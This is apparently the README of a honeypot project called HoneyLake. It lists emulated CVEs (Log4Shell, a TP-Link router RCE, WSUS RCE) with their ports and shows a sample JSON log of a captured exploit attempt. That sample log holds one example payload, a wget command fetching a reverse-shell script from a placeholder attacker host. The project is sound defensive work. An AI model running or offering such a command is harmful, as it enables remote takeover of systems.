# 🐡🐠🐟🐳🐋🦪🪼🐙🦑🦀🦞🐧🦭🐬🪸🦈
# HoneyLake

When you have that many honeypots you might as well call it a lake.

## Pot list

| CVE | Port | Status | Description |
|-----|------|--------|-------------|
| CVE-2021-44228 | 25565 | Implemented | Log4Shell (Minecraft server) |
| CVE-2021-44228 | 8080/8443 | Implemented | Log4Shell (Apache Solr web app) |
| CVE-2023-1389 | 80/443 | Implemented | TP-Link Archer AX21 RCE |
| CVE-2025-59287 | 8530/8531 | Implemented | WSUS RCE |

## Sample logging

All honeypots log exploit attempts in a standardized JSON format, in files named after the `sha256` hash of the request body. Example file:

```json
{
    "version": "1.0",
    "metadata": {
        "timestamp": "2025-11-09T12:34:56.789Z",
        "cve": "CVE-2023-1389",
        "honeypot": "tplink-archer-ax21",
        "client_ip": "192.168.1.100",
        "client_port": 54321
    },
    "request": {
        "method": "POST",
        "path": "/cgi-bin/luci/admin/network",
        "query_string": "action=execute",
        "protocol": "HTTP/1.1",
        "headers": {
            "User-Agent": "curl/7.68.0",
            "Host": "192.168.1.1",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    },
    "body": {
        "raw": "base64_encoded_body",
        "checksum": {
            "algorithm": "sha256",
            "value": "blahblahblah"
        },
        "size": 1024
    },
    "analysis": {
        "extracted_payloads": ["wget http://attacker.tld/reverse-shell.sh"],
        "attack_type": "rce_attempt",
        "confidence": "high"
    }
}
```